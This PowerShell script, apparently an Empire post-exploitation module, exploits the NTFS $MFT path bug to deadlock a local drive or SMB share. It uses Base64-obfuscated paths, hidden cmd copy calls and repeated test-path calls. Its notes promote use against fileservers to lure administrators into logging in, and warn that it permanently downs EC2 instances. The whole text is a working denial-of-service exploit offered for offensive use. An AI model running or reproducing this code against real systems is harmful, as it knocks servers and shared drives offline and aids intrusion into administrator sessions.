function Lock-NTFSVolume {
<#
.SYNOPSIS

Uses the NTFS $MFT vulnerability to IO deadlock a drive.
https://arstechnica.com/information-technology/2017/05/in-a-throwback-to-the-90s-ntfs-bug-lets-anyone-hang-or-crash-windows-7-8-1/

.DESCRIPTION

$MFT is a reserved location within NTFS, which is not readable or writable directly.
Attempting to read an arbitrary file from <ntfs_drive>:\$MFT\ will cause an IO
deadlock that will never resolve. On non-system drives, it renders the drive
inaccessible until a reboot. Done on a system drive, it will cause the system
to progressively stack IO requests until the system either crashes or it is rebooted.
This also works over SMB if the root drive is shared. (e.g. D$)

.EXAMPLE

Lock-NTFSVolume D:
Lock-NTFSVolume \\FS1\share

.NOTES

USING THIS AGAINST AN EC2 INSTANCE WILL IRRECOVERABLY DOS IT. You've been warned.

The current user must have read access to the drive or share.
This is particularly effective when used against non-system drives of fileservers,
as it will almost always cause an admin session to appear.

Running this against the system drive will make the system unusable, including for
your empire agent.

#>

    [CmdletBinding()] Param($RootPath)

    $OSVersion = [Environment]::OSVersion.Version
    $OSMajor = $OSVersion.Major

    $mftpath = join-path $RootPath $([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XCRNRlQ=")))
    $pwnpath = join-path $RootPath $([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XCRNRlRcMTIz")))   
 
    if ($OSMajor -gt 6) {
        "[!] This vulnerability only affects Windows < 8.1/2012 R2. Host is not vulnerable."
    }

    $isUNC = 1

    if (($RootPath).indexOf("\\") -ne 0) {
        $isUNC = 0
        if ($RootPath.length -ne 2) {
            "[!] RootPath should be precisely 2 characters if not UNC path (e.g. 'D:')."
            return "Module failed."
        }

        $drive = $(Get-WMIObject win32_logicaldisk -filter "DeviceID = '$RootPath'")
        if ($drive -eq $null) {
            "[!] $RootPath does not exist."
            return "Module failed."
        }
        
        $fs = $drive.filesystem
        if ("$fs" -ne "NTFS") {
            "[!] $RootPath filesystem is not NTFS"
            return "Module failed."
        }
    }

    if ((Test-Path $mftpath) -eq 0) {
        "[!] The provided path [$RootPath] is not accessible, does not exist, or is not the root of an NTFS volume."
        return "Module failed."
    }

    "[*] Sanity checks passed. If execution hangs after this point, the exploit was successful and any interaction with $RootPath will deadlock."

    if ($isUNC -eq 0) {
        "[+] Triggering exploit with 'copy'"
    } else {
        "[*] Calling 'copy' in preparation for exploit"
    }

    Start-Process -FilePath "cmd" -Wait -WindowStyle Hidden -ArgumentList "/c","copy","/y",$pwnpath'*',$RootPath'\'
    Start-Process -FilePath "cmd" -Wait -WindowStyle Hidden -ArgumentList "/c","copy","/y",$pwnpath,$RootPath'\'
    Start-Process -FilePath "cmd" -Wait -WindowStyle Hidden -ArgumentList "/c","copy","/y",$pwnpath,$RootPath'\'
    cmd /c copy $pwnpath $RootPath

    if ($isUNC -eq 1) {
        "[+] Triggering exploit with test-path. This may take a minute or two."
        test-path $mftpath
        start-sleep 10
        "[*] - Triggering second attempt"
        test-path $mftpath
        start-sleep 10
        "[*] - Triggering third attempt"
        test-path $mftpath
    }

    "[!] Exhausted all methods but target is still responsive. Target does not appear vulnerable, but may have been rendered unstable anyway. Good luck."
}

